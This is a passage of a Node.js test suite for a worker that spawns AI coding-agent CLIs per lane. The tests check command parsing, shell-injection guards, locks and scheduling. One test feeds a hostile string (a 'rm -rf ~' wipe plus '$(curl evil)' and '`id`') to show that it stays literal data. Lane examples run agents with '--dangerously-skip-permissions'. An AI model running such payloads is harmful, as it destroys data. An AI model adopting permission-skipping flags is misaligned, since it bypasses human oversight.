'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const path = require('node:path');
const fs = require('node:fs');

const ROOT = path.join(__dirname, '..');
const {
  laneConfig, laneModel, continuationEligible, pickWork, repoPreflight,
  buildCommand, buildArgv, buildInvocation, laneSpawnIssue,
  claimModelTrailer, briefWithClaimModel,
  promptOneLine, checkLock, lockPathFor,
  readWorkspaceSpecs, readPendingContinuations, tick, validLaneName,
  readVerifierLanes, validateVerifierLane, verifierLaneIssues, verifierLaneAvailable,
  pickVerifyWork, writeVerifyRequest, verifyTick, applyVerifyHumanDecision,
  verifyLockPath,
} = require('../lib/worker');
const { RESULT_BEGIN: VB, RESULT_END: VE } = require('../lib/verifier-worker');

// build a spec object shaped like readWorkspaceSpecs produces
function mk(slug, { stage = 'ready', priority = 'p2', type = 'feature', agent, claimedBy, files, mtime = 0 } = {}) {
  const folder = stage === 'ready' ? 'specs' : stage;
  const body = files !== undefined
    ? '## Scope\n\n### Files to touch\n' + files.map(f => `- \`${f}\``).join('\n') + '\n'
    : '## Objective\nx\n';
  const meta = { priority, type };
  if (agent) meta.agent = agent;
  if (claimedBy) meta.claimed_by = claimedBy;
  return { stage, path: `${folder}/${slug}/`, meta, body, mtime };
}

function cont(spec) { return { file: '_dispatch/' + spec.path.split('/')[1] + '.json', dispatch: { mode: 'continuation', status: 'pending' }, spec }; }

// ---------- lane config ----------

test('laneConfig: reads command + lock timeout, defaults timeout to 120m; argv-first by default', () => {
  const cfg = { lanes: { claude: { command: 'claude -p {prompt_file}' }, codex: { command: 'codex exec -', lock_timeout_minutes: 30 } } };
  assert.deepEqual(laneConfig(cfg, 'claude'), {
    command: 'claude -p {prompt_file}',
    argv: ['claude', '-p', '{prompt_file}'],
    shell: false, listForm: false, model: null, lockTimeoutMinutes: 120,
  });
  assert.equal(laneConfig(cfg, 'codex').lockTimeoutMinutes, 30);
  assert.deepEqual(laneConfig(cfg, 'codex').argv, ['codex', 'exec', '-']);
});

test('laneConfig: YAML list form is verbatim argv (PROVIDERS shape); string form whitespace-splits', () => {
  const cfg = { lanes: { claude: { command: ['claude', '--dangerously-skip-permissions', '-p'] } } };
  const lane = laneConfig(cfg, 'claude');
  assert.deepEqual(lane.argv, ['claude', '--dangerously-skip-permissions', '-p']);
  assert.equal(lane.shell, false);
  assert.equal(lane.listForm, true);
  assert.equal(lane.command, 'claude --dangerously-skip-permissions -p');   // display string
});

test('laneConfig: shell is an explicit literal-true opt-in; argv is null on the shell path', () => {
  const shellLane = laneConfig({ lanes: { c: { command: 'foo | bar', shell: true } } }, 'c');
  assert.equal(shellLane.shell, true);
  assert.equal(shellLane.argv, null);
  assert.equal(shellLane.command, 'foo | bar');
  // anything but literal true is not an opt-in
  for (const v of ['true', 1, 'yes']) {
    assert.equal(laneConfig({ lanes: { c: { command: 'foo', shell: v } } }, 'c').shell, false, String(v));
  }
  // shell: true with list-form command is contradictory — sh needs one string
  assert.equal(laneConfig({ lanes: { c: { command: ['foo', 'bar'], shell: true } } }, 'c'), null);
});

test('laneConfig: unconfigured / malformed lanes are null', () => {
  assert.equal(laneConfig({}, 'claude'), null);
  assert.equal(laneConfig({ lanes: {} }, 'claude'), null);
  assert.equal(laneConfig({ lanes: { claude: {} } }, 'claude'), null);
  assert.equal(laneConfig({ lanes: { claude: { command: '  ' } } }, 'claude'), null);
  assert.equal(laneConfig({ lanes: { claude: { command: [] } } }, 'claude'), null);
  assert.equal(laneConfig({ lanes: { claude: { command: ['  '] } } }, 'claude'), null);
});

test('laneConfig: lanes.<name>.model is an optional scalar carried on every lane shape', () => {
  // string command
  assert.equal(laneConfig({ lanes: { c: { command: 'claude -p', model: 'claude-fable-5' } } }, 'c').model, 'claude-fable-5');
  // list form
  assert.equal(laneConfig({ lanes: { c: { command: ['codex', 'exec', '-'], model: 'gpt-5' } } }, 'c').model, 'gpt-5');
  // shell opt-in
  assert.equal(laneConfig({ lanes: { c: { command: 'foo | bar', shell: true, model: 'composer-1' } } }, 'c').model, 'composer-1');
  // whitespace trimmed; numbers are YAML scalars too
  assert.equal(laneConfig({ lanes: { c: { command: 'claude -p', model: '  gpt-5  ' } } }, 'c').model, 'gpt-5');
  assert.equal(laneConfig({ lanes: { c: { command: 'claude -p', model: 5 } } }, 'c').model, '5');
});

test('laneModel: absent, empty, or non-scalar model is null — absent = unknown, never guessed', () => {
  assert.equal(laneModel({}), null);
  assert.equal(laneModel({ model: '' }), null);
  assert.equal(laneModel({ model: '   ' }), null);
  assert.equal(laneModel({ model: ['gpt-5'] }), null);
  assert.equal(laneModel({ model: { id: 'gpt-5' } }), null);
  assert.equal(laneModel({ model: true }), null);
  assert.equal(laneModel(null), null);
  // and laneConfig passes the same rule through
  assert.equal(laneConfig({ lanes: { c: { command: 'claude -p' } } }, 'c').model, null);
  assert.equal(laneConfig({ lanes: { c: { command: 'claude -p', model: [] } } }, 'c').model, null);
});

test('briefWithClaimModel: no model → brief unchanged; model → claim-scoped trailer with the exact stamp', () => {
  assert.equal(briefWithClaimModel('BRIEF\n', 'claude', null), 'BRIEF\n');
  const out = briefWithClaimModel('BRIEF\n', 'claude', 'claude-fable-5');
  assert.ok(out.startsWith('BRIEF\n'));
  assert.match(out, /lanes\.claude\.model/);
  assert.match(out, /claimed_model: "claude-fable-5"/);
  assert.match(out, /never guess/);
  // newline-safe when the brief lacks a trailing newline
  const noNl = briefWithClaimModel('BRIEF', 'codex', 'gpt-5');
  assert.match(noNl, /^BRIEF\n/);
  assert.match(noNl, /claimed_model: "gpt-5"/);
  assert.equal(claimModelTrailer('codex', 'gpt-5').includes('gpt-5'), true);
});

test('laneSpawnIssue: shell syntax in a string command is a loud misconfig, not a silent split', () => {
  const bad = s => laneSpawnIssue(laneConfig({ lanes: { l: { command: s } } }, 'l'), 'l');
  assert.match(bad("codex -c 'a=[\"x\"]' -"), /argv-first/);
  assert.match(bad('foo | tee log'), /argv-first/);
  assert.match(bad('foo $HOME'), /argv-first/);
  assert.match(bad('foo `date`'), /argv-first/);
  assert.match(bad('foo a\\ b'), /argv-first/);
  assert.match(bad('foo *.js'), /argv-first/);
  assert.match(bad('~/bin/foo -p'), /no shell to expand/);
});

test('laneSpawnIssue: clean argv strings, list-form tokens, and shell opt-ins all pass', () => {
  const ok = cfg => laneSpawnIssue(laneConfig({ lanes: { l: cfg } }, 'l'), 'l');
  assert.equal(ok({ command: 'claude --dangerously-skip-permissions -p' }), null);
  assert.equal(ok({ command: 'cursor-agent -f -p {prompt}' }), null);          // {} placeholders are fine
  // list form: tokens reach execve verbatim — any byte is data, never shell input
  assert.equal(ok({ command: ['codex', '-c', 'sandbox_workspace_write.writable_roots=["/x y"]', '-'] }), null);
  // explicit shell opt-in: sh owns the parsing, no syntax restriction
  assert.equal(ok({ command: 'foo | bar > log', shell: true }), null);
  assert.match(laneSpawnIssue(null, 'ghost'), /not configured/);
});

test('validLaneName: accepts path-safe lane keys only', () => {
  assert.equal(validLaneName('claude'), true);
  assert.equal(validLaneName('codex-1'), true);
  assert.equal(validLaneName('cursor.team_a'), true);
  assert.equal(validLaneName('../codex'), false);
  assert.equal(validLaneName('codex/lane'), false);
  assert.equal(validLaneName('Codex'), false);
  assert.equal(validLaneName(''), false);
});

// ---------- continuation ownership ----------

test('continuationEligible: claimed_by binds — agent:any never overrides a claim', () => {
  const claimed = mk('a', { stage: 'in-progress', agent: 'any', claimedBy: 'claude' });
  assert.equal(continuationEligible(claimed, 'claude'), true);
  assert.equal(continuationEligible(claimed, 'codex'), false);
});

test('continuationEligible: unclaimed falls back to the routing lane (agent: <lane> or any)', () => {
  assert.equal(continuationEligible(mk('a', { stage: 'in-progress', agent: 'any' }), 'codex'), true);
  assert.equal(continuationEligible(mk('a', { stage: 'in-progress' }), 'codex'), true);          // absent = any
  assert.equal(continuationEligible(mk('a', { stage: 'in-progress', agent: 'claude' }), 'codex'), false);
  assert.equal(continuationEligible(mk('a', { stage: 'in-progress', agent: 'claude' }), 'claude'), true);
});

// ---------- selection order ----------

test('pickWork: continuation beats ready — one tick, one pick', () => {
  const kicked = mk('kicked', { stage: 'in-progress', claimedBy: 'claude', files: ['a.js'] });
  const specs = [kicked, mk('fresh', { files: ['b.js'] })];
  const pick = pickWork({ specs, continuations: [cont(kicked)], lane: 'claude' });
  assert.equal(pick.kind, 'continuation');
  assert.equal(pick.picked, '_dispatch/kicked.json');
});

test('pickWork: lane mismatch — a codex tick ignores a claude-claimed continuation and does NOT claim fresh work', () => {
  const kicked = mk('kicked', { stage: 'in-progress', claimedBy: 'claude', files: ['a.js'] });
  const specs = [kicked, mk('fresh', { files: ['b.js'] })];
  // tl run holds the ready queue behind any pending continuation, so the codex
  // tick must not spawn at all — the brief would be claude's resume.
  const pick = pickWork({ specs, continuations: [cont(kicked)], lane: 'codex' });
  assert.equal(pick.picked, null);
  assert.equal(pick.reason, 'no_continuation');
});

test('pickWork: no continuations → one conflict-free ready spec in this lane', () => {
  const specs = [
    mk('other-lane', { agent: 'codex', files: ['a.js'], priority: 'p0' }),
    mk('mine', { agent: 'claude', files: ['b.js'], priority: 'p1' }),
    mk('anyone', { files: ['c.js'], priority: 'p2' }),
  ];
  const pick = pickWork({ specs, continuations: [], lane: 'claude' });
  assert.equal(pick.kind, 'ready');
  assert.equal(pick.picked, 'specs/mine/');   // p1 beats p2; p0 is another lane's
});

test('pickWork: active-work conflicts hold ready specs (batch discipline)', () => {
  const specs = [
    mk('active', { stage: 'in-progress', files: ['shared.js'] }),
    mk('collides', { files: ['shared.js'] }),
  ];
  const pick = pickWork({ specs, continuations: [], lane: 'claude' });
  assert.equal(pick.picked, null);
  assert.equal(pick.reason, 'no_ready');
});

test('pickWork: dirty git paths hold a colliding ready spec', () => {
  const specs = [mk('collides', { files: ['ui/index.html'] })];
  const pick = pickWork({ specs, continuations: [], lane: 'claude', dirtyPaths: ['ui/index.html'] });
  assert.equal(pick.picked, null);
  assert.equal(pick.reason, 'no_ready');
});

test('pickWork: empty queue is no_ready', () => {
  const pick = pickWork({ specs: [], continuations: [], lane: 'claude' });
  assert.equal(pick.reason, 'no_ready');
});

// ---------- calm cap (TRIAGE.yml run: { cap: N }) ----------

test('pickWork: run cap bounds the fresh batch — cap 1 with 3 eligible ready specs selects 1', () => {
  const specs = [
    mk('a', { files: ['a.js'], priority: 'p0' }),
    mk('b', { files: ['b.js'], priority: 'p1' }),
    mk('c', { files: ['c.js'], priority: 'p2' }),
  ];
  const pick = pickWork({ specs, continuations: [], lane: 'claude', triageCfg: { run: { cap: 1 } } });
  assert.equal(pick.kind, 'ready');
  assert.equal(pick.picked, 'specs/a/');       // highest priority still wins the one slot
  assert.equal(pick.batch.length, 1);          // capped at 1, not the default 4
});

test('pickWork: missing or garbage run cap falls back to the default 4 (bin/tl.js parity)', () => {
  const specs = [
    mk('a', { files: ['a.js'], mtime: 1 }),
    mk('b', { files: ['b.js'], mtime: 2 }),
    mk('c', { files: ['c.js'], mtime: 3 }),
  ];
  for (const triageCfg of [undefined, null, {}, { run: {} }, { run: { cap: 0 } }, { run: { cap: -2 } }, { run: { cap: 'banana' } }]) {
    const pick = pickWork({ specs, continuations: [], lane: 'claude', triageCfg });
    assert.equal(pick.batch.length, 3, 'fallback cap 4 admits all 3 for cfg ' + JSON.stringify(triageCfg));
  }
});

// ---------- claim-time asset preflight: repo-held work is not eligible work ----------

// Non-tl workspace stub: nothing is a usable checkout.
const NO_REPOS = { isRepo: () => false, tlRoot: '/tl/checkout', workspaceRepo: '/repos/proj' };

test('pickWork: a repo-held ready spec is not eligible work', () => {
  const specs = [mk('void', { files: ['a.js'] })];
  specs[0].meta.repo = '/repos/missing';
  const pick = pickWork({ specs, continuations: [], lane: 'claude', preflight: NO_REPOS });
  assert.equal(pick.picked, null);
  assert.equal(pick.reason, 'no_ready');
});

test('pickWork: an eligible continuation whose repo is a void does not spawn — repo_held', () => {
  const kicked = mk('kicked', { stage: 'in-progress', claimedBy: 'claude', files: ['a.js'] });
  kicked.meta.repo = '/repos/missing';
  const pick = pickWork({ specs: [kicked], continuations: [cont(kicked)], lane: 'claude', preflight: NO_REPOS });
  assert.equal(pick.picked, null);
  assert.equal(pick.reason, 'repo_held');
});

test('repoPreflight: reads PROJECT.md repo, checks .git existence via fs', () => {
  const dir = fs.mkdtempSync(path.join(ROOT, 'projects', 'tl-preflight-'));
  try {
    fs.writeFileSync(path.join(dir, 'PROJECT.md'), '---\nname: "x"\nrepo: "/some/where"\n---\n');
    const p = repoPreflight(ROOT, dir);
    assert.equal(p.tlRoot, ROOT);
    assert.equal(p.workspaceRepo, '/some/where');
    assert.equal(p.isRepo(ROOT), true);                          // this checkout has .git
    assert.equal(p.isRepo(path.join(ROOT, 'lib')), false);       // dir without .git
    assert.equal(p.isRepo('/nonexistent-tl-preflight'), false);  // missing dir
    // no PROJECT.md → workspaceRepo null
    assert.equal(repoPreflight(ROOT, path.join(dir, 'nope')).workspaceRepo, null);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

// ---------- prompt delivery: argv default ----------

test('buildArgv: {prompt_file} substitutes the raw path per token — no escaping needed', () => {
  const { argv, stdin } = buildArgv(['claude', '-p', '{prompt_file}'], '/tmp/x y.txt', 'brief');
  assert.deepEqual(argv, ['claude', '-p', '/tmp/x y.txt']);   // spaces survive as one argument
  assert.equal(stdin, false);
});

test('buildArgv: {prompt} becomes one argument holding the whole one-line brief', () => {
  const { argv, stdin } = buildArgv(['agent', '--prompt', '{prompt}'], '/tmp/p.txt', "line one\nit's line two\n");
  assert.equal(stdin, false);
  assert.deepEqual(argv, ['agent', '--prompt', "line one it's line two"]);
});

test('buildArgv: hostile brief content stays literal data — the injection surface is gone', () => {
  const evil = "'; rm -rf ~ #\n$(curl evil) `id` && echo pwned";
  const { argv } = buildArgv(['agent', '-p', '{prompt}'], '/tmp/p.txt', evil);
  assert.equal(argv.length, 3);
  assert.equal(argv[2], promptOneLine(evil));   // verbatim single argument, quotes and all
});

test('buildArgv: no placeholder → prompt on stdin, tokens untouched (copy, not alias)', () => {
  const tokens = ['codex', 'exec', '-'];
  const { argv, stdin } = buildArgv(tokens, '/tmp/p.txt', 'brief');
  assert.deepEqual(argv, tokens);
  assert.notEqual(argv, tokens);
  assert.equal(stdin, true);
});

test('buildInvocation: argv default vs shell opt-in — the spawn contract as shipped', () => {
  const argvLane = laneConfig({ lanes: { c: { command: 'claude -p' } } }, 'c');
  const inv = buildInvocation(argvLane, '/tmp/p.txt', 'brief\n');
  assert.deepEqual(inv, { shell: false, argv: ['claude', '-p'], command: 'claude -p', stdin: true });

  const shellLane = laneConfig({ lanes: { c: { command: 'claude -p {prompt}', shell: true } } }, 'c');
  const sh = buildInvocation(shellLane, '/tmp/p.txt', "it's\n");
  assert.equal(sh.shell, true);
  assert.equal(sh.argv, null);
  assert.equal(sh.command, "claude -p 'it'\\''s'");   // escape helpers still guard the opt-in path
  assert.equal(sh.stdin, false);
});

// ---------- shell-escaped prompt delivery (the shell: true opt-in path) ----------

test('buildCommand: {prompt_file} substitutes the escaped temp-file path', () => {
  const { command, stdin } = buildCommand('claude -p {prompt_file}', '/tmp/x y.txt', 'brief');
  assert.equal(command, "claude -p '/tmp/x y.txt'");
  assert.equal(stdin, false);
});

test('buildCommand: {prompt} substitutes a shell-escaped single-line brief', () => {
  const { command, stdin } = buildCommand('agent --prompt {prompt}', '/tmp/p.txt', "line one\nit's line two\n");
  assert.equal(stdin, false);
  assert.equal(command, "agent --prompt 'line one it'\\''s line two'");
});

test('buildCommand: neither placeholder → prompt on stdin, template untouched', () => {
  const { command, stdin } = buildCommand('codex exec -', '/tmp/p.txt', 'brief');
  assert.equal(command, 'codex exec -');
  assert.equal(stdin, true);
});

test('promptOneLine collapses newlines, preserves content order', () => {
  assert.equal(promptOneLine('a\n\n  b\r\nc  '), 'a b c');
});

// ---------- lock check ----------

test('checkLock: free / held / stale by mtime against the timeout', () => {
  const dir = fs.mkdtempSync(path.join(ROOT, 'projects', 'tl-worker-lock-'));
  try {
    const file = path.join(dir, 'claude.lock');
    assert.equal(checkLock(file, Date.now(), 120).state, 'free');
    fs.writeFileSync(file, '{}');
    assert.equal(checkLock(file, Date.now(), 120).state, 'held');
    const old = new Date(Date.now() - 3 * 60 * 60 * 1000);   // 3h ago > 2h timeout
    fs.utimesSync(file, old, old);
    assert.equal(checkLock(file, Date.now(), 120).state, 'stale');
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

// ---------- tick (integration over a throwaway workspace; no real spawns) ----------

const LANES_YML = [
  'lanes:',
  '  claude:',
  '    command: "echo run -p {prompt_file}"',
  '  codex:',
  '    command: "echo codex-stdin"',
  '',
].join('\n');

function withWorkspace(opts, fn) {
  const name = 'tl-workertest-' + process.pid + '-' + Math.random().toString(36).slice(2, 8);
  const dir = path.join(ROOT, 'projects', name);
  try {
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'TRIAGE.yml'), opts.triage !== undefined ? opts.triage : LANES_YML);
    // Default identity: a tl-developing-tl workspace (PROJECT.md repo points at
    // this checkout), so the claim-time containment guard is exempt and the
    // scaffold's repo-less code specs stay eligible. Pass projectRepo to make
    // the workspace target another repo instead.
    fs.writeFileSync(path.join(dir, 'PROJECT.md'),
      `---\nname: "${name}"\nrepo: "${opts.projectRepo || ROOT}"\n---\n`);
    for (const s of opts.specs || []) {
      const folder = (s.stage && s.stage !== 'ready') ? s.stage : 'specs';
      const specDir = path.join(dir, folder, s.slug);
      fs.mkdirSync(specDir, { recursive: true });
      const fm = ['---', `title: "${s.slug}"`, 'type: feature', `status: ${s.status || s.stage || 'ready'}`]
        .concat(s.agent ? [`agent: ${s.agent}`] : [])
        .concat(s.claimedBy ? [`claimed_by: ${s.claimedBy}`] : [])
        .concat(s.repo ? [`repo: "${s.repo}"`] : [])
        .concat(s.awaitingVerifier ? ['awaiting_verifier: true'] : [])
        .concat(s.extraFm || [])
        .concat(['---', '', '## Objective', 'x', '',
          '## Acceptance criteria', '', '- works', '',
          '## Scope', '', '### Files to touch',
          ...(s.files || []).map(f => `- \`${f}\``), '']).join('\n');
      fs.writeFileSync(path.join(specDir, 'SPEC.md'), fm);
      if (s.verifyMd) fs.writeFileSync(path.join(specDir, 'VERIFY.md'), s.verifyMd);
      if (s.feedback) {
        fs.mkdirSync(path.join(specDir, 'outcome'), { recursive: true });
        fs.writeFileSync(path.join(specDir, 'outcome', 'FEEDBACK.md'), s.feedback);
      }
    }
    for (const [rel, content] of Object.entries(opts.files || {})) {
      const f = path.join(dir, rel);
      fs.mkdirSync(path.dirname(f), { recursive: true });
      fs.writeFileSync(f, content);
    }
    return fn({ name, dir });
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

// run a tick with mocked seams; returns { result, lines, spawns, ws }
function runTick(ws, { lane = 'claude', dryRun = false, brief = 'RUN BRIEF\nbody\n', childCode = 0, spawnThrows = false, onSpawn } = {}) {
  const lines = [];
  const spawns = [];
  const result = tick({
    root: ROOT, wsDir: ws.dir, wsName: ws.name, lane, dryRun,
    dirtyPaths: [],                       // deterministic — the real repo tree is not under test
    print: s => lines.push(s),
    getRunBrief: () => brief,
    spawnLane: args => {
      spawns.push(args);
      if (onSpawn) onSpawn(args);
      if (spawnThrows) throw new Error('ENOENT: agent CLI not found');
      return childCode;
    },
  });
  return { result, lines, spawns };
}

function readLog(ws) {
  const f = path.join(ws.dir, '_metrics', 'worker-log.jsonl');
  if (!fs.existsSync(f)) return [];
  return fs.readFileSync(f, 'utf8').trim().split('\n').filter(Boolean).map(JSON.parse);
}

test('tick: no work exits 0, prints the reason, logs spawned:false, spawns nothing', () => {
  withWorkspace({}, ws => {
    const { result, lines, spawns } = runTick(ws);
    assert.equal(result.code, 0);
    assert.equal(result.spawned, false);
    assert.equal(spawns.length, 0);
    assert.match(lines.join('\n'), /no work for lane "claude" — no_ready/);
    const log = readLog(ws);
    assert.equal(log.length, 1);
    assert.equal(log[0].workspace, ws.name);
    assert.equal(log[0].lane, 'claude');
    assert.equal(log[0].picked, 'none');
    assert.equal(log[0].spawned, false);
    assert.equal(log[0].exit_code, 0);
    assert.equal(log[0].reason, 'no_ready');
    assert.equal(typeof log[0].duration_seconds, 'number');
  });
});

test('tick: unconfigured lane exits 1, nothing executes', () => {
  withWorkspace({ triage: 'goals: []\n', specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const { result, lines, spawns } = runTick(ws);
    assert.equal(result.code, 1);
    assert.equal(spawns.length, 0);
    assert.match(lines.join('\n'), /lane "claude" is not configured/);
    assert.equal(readLog(ws)[0].reason, 'lane_unconfigured');
  });
});

test('tick: invalid lane exits 1 before artifact path construction', () => {
  withWorkspace({
    triage: [
      'lanes:',
      '  ../codex:',
      '    command: "echo bad {prompt_file}"',
      '',
    ].join('\n'),
    specs: [{ slug: 'r', files: ['a.js'] }],
  }, ws => {
    const { result, lines, spawns } = runTick(ws, { lane: '../codex' });
    assert.equal(result.code, 1);
    assert.equal(result.reason, 'lane_unconfigured');
    assert.equal(spawns.length, 0);
    assert.match(lines.join('\n'), /invalid lane/);
    assert.equal(fs.existsSync(path.join(ws.dir, '_metrics', 'worker-prompts')), false);
    assert.equal(fs.existsSync(path.join(ws.dir, 'codex.lock')), false);
  });
});

test('tick: PAUSE halts all lanes — exit 2, no spawn', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }], files: { PAUSE: '' } }, ws => {
    const { result, spawns } = runTick(ws);
    assert.equal(result.code, 2);
    assert.equal(result.reason, 'paused');
    assert.equal(spawns.length, 0);
    assert.equal(readLog(ws)[0].exit_code, 2);
  });
});

test('tick: held lock exits 2 without spawning; stale lock is taken over', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const lock = lockPathFor(ws.dir, 'claude');
    fs.mkdirSync(path.dirname(lock), { recursive: true });
    fs.writeFileSync(lock, '{}');

    const held = runTick(ws);
    assert.equal(held.result.code, 2);
    assert.equal(held.result.reason, 'locked');
    assert.equal(held.spawns.length, 0);

    // age the lock past the 2h default → takeover, spawn happens, lock removed
    const old = new Date(Date.now() - 3 * 60 * 60 * 1000);
    fs.utimesSync(lock, old, old);
    const stale = runTick(ws);
    assert.equal(stale.result.code, 0);
    assert.equal(stale.result.spawned, true);
    assert.equal(stale.spawns.length, 1);
    assert.match(stale.lines.join('\n'), /stale lock.*taking over/);
    assert.equal(fs.existsSync(lock), false);
    const last = readLog(ws).pop();
    assert.equal(last.stale_lock_takeover, true);
  });
});

test('tick: dry run prints the exact command + prompt path, writes nothing, exit 0', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const { result, lines, spawns } = runTick(ws, { dryRun: true });
    assert.equal(result.code, 0);
    assert.equal(spawns.length, 0);
    const outText = lines.join('\n');
    assert.match(outText, /dry run — lane "claude" would spawn for specs\/r\//);
    assert.match(outText, /echo run -p .*_metrics\/worker-prompts\/claude-.*\.txt/);
    assert.match(outText, /argv: \["echo","run","-p",".*worker-prompts.*\.txt"\]/);
    assert.match(outText, /prompt file: /);
    // no artifacts: no lock, no prompt file, no log line
    assert.equal(fs.existsSync(lockPathFor(ws.dir, 'claude')), false);
    assert.equal(fs.existsSync(path.join(ws.dir, '_metrics', 'worker-prompts')), false);
    assert.equal(readLog(ws).length, 0);
  });
});

test('tick: eligible ready spec spawns once — prompt file written, lock held during spawn, removed after, child 0 → exit 0', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const lock = lockPathFor(ws.dir, 'claude');
    let lockDuringSpawn = false, promptDuringSpawn = null;
    const { result, spawns } = runTick(ws, {
      brief: 'THE BRIEF\nsecond line\n',
      onSpawn: args => {
        lockDuringSpawn = fs.existsSync(lock);
        promptDuringSpawn = fs.readFileSync(args.argv[3], 'utf8');   // ['echo','run','-p',<path>]
      },
    });
    assert.equal(result.code, 0);
    assert.equal(result.spawned, true);
    assert.equal(spawns.length, 1);
    assert.equal(spawns[0].shell, false);             // argv default — no shell anywhere
    assert.deepEqual(spawns[0].argv.slice(0, 3), ['echo', 'run', '-p']);
    assert.match(spawns[0].argv[3], /worker-prompts.*\.txt$/);
    assert.equal(spawns[0].stdin, null);              // {prompt_file} template → no stdin
    assert.equal(lockDuringSpawn, true);              // created just before spawn
    assert.equal(promptDuringSpawn, 'THE BRIEF\nsecond line\n');
    assert.equal(fs.existsSync(lock), false);         // removed after child exit
    const line = readLog(ws)[0];
    assert.equal(line.picked, 'specs/r/');
    assert.equal(line.spawned, true);
    assert.equal(line.exit_code, 0);
    assert.equal(line.child_exit_code, 0);
  });
});

test('tick: template with no placeholder delivers the brief on stdin', () => {
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const { result, spawns } = runTick(ws, { lane: 'codex', brief: 'STDIN BRIEF\n' });
    assert.equal(result.code, 0);
    assert.equal(spawns[0].shell, false);
    assert.deepEqual(spawns[0].argv, ['echo', 'codex-stdin']);
    assert.equal(spawns[0].command, 'echo codex-stdin');
    assert.equal(spawns[0].stdin, 'STDIN BRIEF\n');
  });
});

test('tick: lanes.<lane>.model rides the delivered brief as a claimed_model trailer (stdin path) and the lock carries model', () => {
  withWorkspace({
    triage: [
      'lanes:',
      '  codex:',
      '    command: "echo codex-stdin"',
      '    model: gpt-5',
      '',
    ].join('\n'),
    specs: [{ slug: 'r', files: ['a.js'] }],
  }, ws => {
    const lock = lockPathFor(ws.dir, 'codex');
    let lockBody = null;
    const { result, spawns } = runTick(ws, {
      lane: 'codex', brief: 'STDIN BRIEF\n',
      onSpawn: () => { lockBody = JSON.parse(fs.readFileSync(lock, 'utf8')); },
    });
    assert.equal(result.code, 0);
    assert.ok(spawns[0].stdin.startsWith('STDIN BRIEF\n'));
    assert.match(spawns[0].stdin, /lanes\.codex\.model/);
    assert.match(spawns[0].stdin, /claimed_model: "gpt-5"/);
    assert.match(spawns[0].stdin, /never guess/);
    assert.equal(lockBody.model, 'gpt-5');
  });
});

test('tick: lanes.<lane>.model trailer lands in the {prompt_file} prompt too; no model → no trailer, no lock field', () => {
  withWorkspace({
    triage: [
      'lanes:',
      '  claude:',
      '    command: "echo run -p {prompt_file}"',
      '    model: claude-fable-5',
      '  codex:',
      '    command: "echo codex-stdin"',
      '',
    ].join('\n'),
    specs: [{ slug: 'r', files: ['a.js'] }],
  }, ws => {
    let prompt = null;
    const withModel = runTick(ws, {
      brief: 'THE BRIEF\n',
      onSpawn: args => { prompt = fs.readFileSync(args.argv[3], 'utf8'); },
    });
    assert.equal(withModel.result.code, 0);
    assert.ok(prompt.startsWith('THE BRIEF\n'));
    assert.match(prompt, /claimed_model: "claude-fable-5"/);
  });
  withWorkspace({ specs: [{ slug: 'r', files: ['a.js'] }] }, ws => {
    const lock = lockPathFor(ws.dir, 'codex');
    let lockBody = null;
    const { spawns } = runTick(ws, {
      lane: 'codex', brief: 'PLAIN BRIEF\n',
      onSpawn: () => { lockBody = JSON.parse(fs.readFileSync(lock, 'utf8')); },
    });
    assert.equal(spawns[0].stdin, 'PLAIN BRIEF\n');   // byte-identical — no trailer
    assert.equal('model' in lockBody, false);
  });
});

test('tick: shell syntax without shell opt-in exits 1 loudly — nothing executes', () => {
  withWorkspace({
    triage: [
      'lanes:',
      '  claude:',
      '    command: "claude -p | tee /tmp/log"',
      '',
    ].join('\n'),
    specs: [{ slug: 'r', files: ['a.js'] }],
  }, ws => {
    const { result, lines, spawns } = runTick(ws);
    assert.equal(result.code, 1);
    assert.equal(result.spawned, false);
    assert.equal(spawns.length, 0);
    assert.match(lines.join('\n'), /argv-first/);
    assert.match(lines.join('\n'), /lanes\.claude\.shell: true/);
    assert.equal(readLog(ws)[0].reason, 'shell_required');
    // misconfig screams before any artifact: no prompt file, no lock
    assert.equal(fs.existsSync(path.join(ws.dir, '_metrics', 'worker-prompts')), false);
    assert.equal(fs.existsSync(lockPathFor(ws.dir, 'claude')), false);
  });
});

test('tick: lanes.<lane>.shell: true opts in — spawn receives shell:true and the escaped command string', () => {
  withWorkspace({
    triage: [
      'lanes:',
      '  claude:',
      '    command: "echo go -p {prompt_file} | tee /dev/null"',
      '    shell: true',
      '',
    ].join('\n'),
    specs: [{ slug: 'r', files: ['a.js'] }],
  }, ws => {
    const { result, spawns } = runTick(ws, { brief: 'B\n' });
    assert.equal(result.code, 0);
    assert.equal(result.spawned, true);
    assert.equal(spawns[0].shell, true);
    assert.equal(spawns[0].argv, null);
    assert.match(spawns[0].command, /echo go -p '.*worker-prompts.*\.txt' \| tee \/dev\/null/);   // escape helpers still applied
    assert.equal(spawns[0].stdin, null);
  });
});

test('tick: YAML list-form lane command spawns verbatim argv', () => {
  withWorkspace({
    triage: [
      'lanes:',
      '  claude:',
      '    command: [echo, run, --flag, -p]',
      '',
    ].join('\n'),
    specs: [{ slug: 'r', files: ['a.js'] }],
  }, ws => {
    const { result, spawns } = runTick(ws, { brief: 'B\n' });
    assert.equal(result.code, 0);
    assert.equal(spawns[0].shell, false);
    assert.deepEqual(spawns[0].argv, ['echo', 'run', '--flag', '-p']);
    assert.equal(spawns[0].stdin, 'B\n');   // no placeholder → stdin
  });
});

// ---------- back-compat: the real dogfood lane commands keep working ----------

// Copies of every lane command shipped in real TRIAGE.ymls at migration time
// (projects/throughline, projects/todo-app, plus the docs' cursor example).
// Each must parse to the same binary + args it always meant, pass the argv
// guard with no shell opt-in, and keep stdin prompt delivery.
const DOGFOOD_LANES = [
  { lane: 'claude', command: 'claude --dangerously-skip-permissions -p', argv: ['claude', '--dangerously-skip-permissions', '-p'] },
